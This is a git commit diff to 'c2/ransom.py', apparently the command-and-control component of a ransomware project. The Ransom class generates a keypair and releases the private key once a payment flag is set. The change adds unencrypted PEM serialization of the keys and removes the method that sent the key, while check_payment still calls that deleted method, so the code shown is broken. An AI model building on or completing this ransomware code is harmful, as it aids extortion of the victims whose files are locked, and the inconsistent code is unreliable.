e5fe54961dc61543ab4f012874390c03dd4cdf81
Galen <65838051+Galen-Dively@users.noreply.github.com>
2026-03-24 15:04:47 -0400

    Implement key serialization methods in Ransom class
    Added methods to serialize private and public keys.

--- c2/ransom.py
+++ c2/ransom.py
@@ -1,21 +1,33 @@
 import keygen
-
+import pickle
+from cryptography.hazmat.primitives import serialization
 
 
 class Ransom:
     def __init__(self):
         self.private_key, self.public_key = keygen.create_keypair()
-        keygen.save_keypair(self.private_key, self.public_key)
+        # keygen.save_keypair(self.private_key, self.public_key)
 
     
     def check_payment(self, conn):
         if globals.get_payment():
             self.send_key(conn)
 
-    def send_key(self, conn):  
-        with open("priv.pem", "r") as f:
-            key = f.read()
-        conn.send(key.encode())
-        print("Sent private key")
+    def serialize_private_key(self):
+        return self.private_key.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.PKCS8,
+            encryption_algorithm=serialization.NoEncryption()
+        )
 
-        
+
+    def serialize_public_key(self):
+        return self.public_key.public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo
+        )
+
+
+if __name__ == "__main__":
+    r = Ransom()
+    print(r.private_key)
